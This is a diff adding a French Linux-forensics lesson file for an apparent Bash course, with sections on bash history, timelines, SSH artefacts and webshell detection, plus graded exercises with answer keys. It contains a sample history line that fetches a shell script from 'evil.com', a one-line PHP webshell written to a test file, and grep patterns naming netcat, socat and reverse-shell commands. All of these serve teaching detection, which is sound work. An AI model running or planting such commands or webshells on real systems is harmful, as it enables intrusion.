@@ -1,0 +1,58 @@
+{
+  "id": "bash-l6-m4",
+  "title": "Forensics Linux — artefacts et timeline",
+  "lang": "bash",
+  "level": 6,
+  "order": 4,
+  "estimatedMinutes": 65,
+  "course": [
+    {
+      "section": "Sources d'artefacts forensics Linux",
+      "content": "L'analyse forensics Linux consiste à reconstruire la **timeline** des actions d'un attaquant à partir des artefacts laissés sur le système.\n\n**Artefacts clés** :\n- `/var/log/auth.log` — authentifications\n- `~/.bash_history` — commandes exécutées\n- `/proc/<pid>/` — processus actifs\n- `/tmp/`, `/var/tmp/` — fichiers temporaires\n- `~/.ssh/` — clés et connexions SSH\n- `/etc/crontab`, cron.d — tâches planifiées\n- Syslog, journal systemd — événements système\n\n```bash\n# ─── Historique bash tous les utilisateurs ───\nfor home in /root /home/*; do\n    hist=\"$home/.bash_history\"\n    if [[ -f \"$hist\" ]]; then\n        echo \"=== $home ===\"\n        tail -20 \"$hist\"\n    fi\ndone\n\n# ─── Dernières commandes sudo ───\ngrep 'sudo' /var/log/auth.log | grep COMMAND | tail -20\n\n# ─── Fichiers récemment accédés ───\nfind / -atime -1 -type f 2>/dev/null \\\n  | grep -v '/proc\\|/sys\\|/dev' | head -30\n```"
+    },
+    {
+      "section": "Reconstruction de timeline avec mactime",
+      "content": "```bash\n#!/bin/bash\n# Reconstruction de timeline par timestamps de fichiers\n# (MACTIME : Modified, Accessed, Changed, Birth)\n\nbuild_timeline() {\n    local répertoire=\"${1:-/home}\"\n    local heures=\"${2:-24}\"\n    local output=\"timeline_$(date +%Y%m%d).txt\"\n    \n    echo \"=== Timeline : $répertoire (${heures}h) ===\"\n    \n    # Fichiers modifiés\n    echo \"[Modifiés]\"\n    find \"$répertoire\" -mmin \"-$((heures * 60))\" -type f 2>/dev/null \\\n      | while read f; do\n          printf \"%s  %s\\n\" \\\n            \"$(stat -c '%y' \"$f\" 2>/dev/null | cut -c1-19)\" \\\n            \"$f\"\n      done | sort | tee -a \"$output\"\n    \n    # Fichiers créés\n    echo \"\"\n    echo \"[Créés récemment]\"\n    find \"$répertoire\" -newer /etc/passwd -type f 2>/dev/null \\\n      | head -20 | tee -a \"$output\"\n    \n    echo \"\"\n    echo \"Timeline sauvegardée : $output\"\n}\n\n# Analyser les accès récents dans /etc\nbuild_timeline \"/etc\" 48\n```"
+    },
+    {
+      "section": "Analyse des connexions SSH persistantes",
+      "content": "```bash\n#!/bin/bash\n# Analyse forensics SSH — connexions, clés, tunnels\n\necho \"=== Forensics SSH ===\"\n\n# Connexions réussies avec durée\necho \"[Sessions SSH complètes]\"\ngrep 'pam_unix.*opened' /var/log/auth.log 2>/dev/null \\\n  | awk '{print $1,$2,$3,$11}' | head -20\n\n# IPs sources uniques (authentifications réussies)\necho \"\"\necho \"[IPs sources (succès)]\"\ngrep 'Accepted' /var/log/auth.log 2>/dev/null \\\n  | awk '{print $11}' | sort | uniq -c | sort -rn\n\n# Clés SSH autorisées (backdoor potentielle)\necho \"\"\necho \"[Clés SSH autorisées]\"\nfor f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do\n    if [[ -f \"$f\" ]]; then\n        echo \"  $f :\"\n        while read line; do\n            # Extraire le commentaire (nom de la clé)\n            type=$(echo \"$line\" | awk '{print $1}')\n            comment=$(echo \"$line\" | awk '{print $NF}')\n            echo \"    $type ... $comment\"\n        done < \"$f\"\n    fi\ndone\n\n# Known hosts (machines visitées depuis ce système)\necho \"\"\necho \"[Known hosts]\"\nfor f in /root/.ssh/known_hosts /home/*/.ssh/known_hosts; do\n    [[ -f \"$f\" ]] && echo \"  $f : $(wc -l < $f) entrées\"\ndone\n```"
+    },
+    {
+      "section": "Recherche de webshells et backdoors",
+      "content": "```bash\n#!/bin/bash\n# Détecter webshells et backdoors courants\n\nWEBROOT=\"${1:-/var/www/html}\"\n\necho \"=== Recherche webshells : $WEBROOT ===\"\n\n# ─── Patterns de webshell dans les fichiers PHP ───\nif [[ -d \"$WEBROOT\" ]]; then\n    echo \"[PHP suspects]\"\n    grep -r -l --include='*.php' \\\n        -E 'eval\\(base64_decode|system\\(\\$_|exec\\(\\$_|passthru|shell_exec' \\\n        \"$WEBROOT\" 2>/dev/null | head -10\n    \n    # Fichiers PHP récemment modifiés\n    echo \"\"\n    echo \"[PHP modifiés récemment (72h)]\"\n    find \"$WEBROOT\" -name '*.php' -mtime -3 2>/dev/null | head -10\nfi\n\n# ─── Netcat/socat listeners ───\necho \"\"\necho \"[Backdoors réseau potentielles]\"\nps aux | grep -E 'nc -l|ncat|socat.*LISTEN|bash -i' | grep -v grep\n\n# ─── Fichiers dans /tmp avec permission d'exécution ───\necho \"\"\necho \"[Exécutables dans /tmp]\"\nfind /tmp /var/tmp -perm /111 -type f 2>/dev/null | head -10\n\n# ─── Tâches cron suspectes ───\necho \"\"\necho \"[Cron avec téléchargements]\"\ngrep -r -E 'wget|curl|bash.*http|python.*http' \\\n    /etc/crontab /etc/cron.d/ /var/spool/cron/ 2>/dev/null | head -10\n```"
+    }
+  ],
+  "exercises": [
+    {
+      "id": "bash-l6-m4-ex1",
+      "title": "Extraire l'historique bash d'un utilisateur",
+      "description": "Lire le bash_history pour reconstituer les actions d'un utilisateur",
+      "instructions": "Créez un faux fichier historique et lisez ses 3 dernières commandes :\n```bash\necho -e 'ls /\\ncat /etc/passwd\\nwget http://evil.com/shell.sh' > /tmp/fake_history\n```\nAffichez les 3 dernières lignes :\n```\nls /\ncat /etc/passwd\nwget http://evil.com/shell.sh\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "wget http://evil.com/shell.sh",
+      "correction": "echo -e 'ls /\\ncat /etc/passwd\\nwget http://evil.com/shell.sh' > /tmp/fake_history\ntail -3 /tmp/fake_history",
+      "explanation": "En forensics, `~/.bash_history` est souvent la première source lue après une compromission. Les attaquants l'effacent parfois (`history -c`, `HISTSIZE=0`), ce qui est lui-même un IOC."
+    },
+    {
+      "id": "bash-l6-m4-ex2",
+      "title": "Obtenir les métadonnées d'un fichier",
+      "description": "Utiliser stat pour obtenir les timestamps MAC d'un fichier",
+      "instructions": "Obtenez la date de dernière modification du fichier `/etc/hosts` avec `stat` et affichez :\n```\nDernière modification : [date]\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "Dernière modification :",
+      "correction": "mtime=$(stat -c '%y' /etc/hosts | cut -c1-19)\necho \"Dernière modification : $mtime\"",
+      "explanation": "`stat -c '%y'` affiche la date de modification (mtime) au format lisible. `%x` = atime (accès), `%z` = ctime (changement de métadonnée), `%w` = birth time. Ces timestamps constituent la timeline forensics."
+    },
+    {
+      "id": "bash-l6-m4-ex3",
+      "title": "Détecter des patterns suspects dans des scripts",
+      "description": "Rechercher des indicateurs de webshell dans des fichiers",
+      "instructions": "Créez un fichier `test_shell.php` contenant `eval(base64_decode($_POST['cmd']));` et cherchez des patterns webshell dedans. Affichez :\n```\nWebshell détecté : test_shell.php\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "Webshell détecté : test_shell.php",
+      "correction": "echo \"eval(base64_decode(\\$_POST['cmd']));\" > test_shell.php\nif grep -qE 'eval\\(base64_decode' test_shell.php; then\n    echo \"Webshell détecté : test_shell.php\"\nfi",
+      "explanation": "`grep -qE` : `-q` silencieux (retourne juste le code de retour), `-E` regex étendue. Les patterns `eval(base64_decode`, `system($_`, `exec($_POST` sont les signatures les plus communes de webshells PHP."
+    }
+  ]
+}
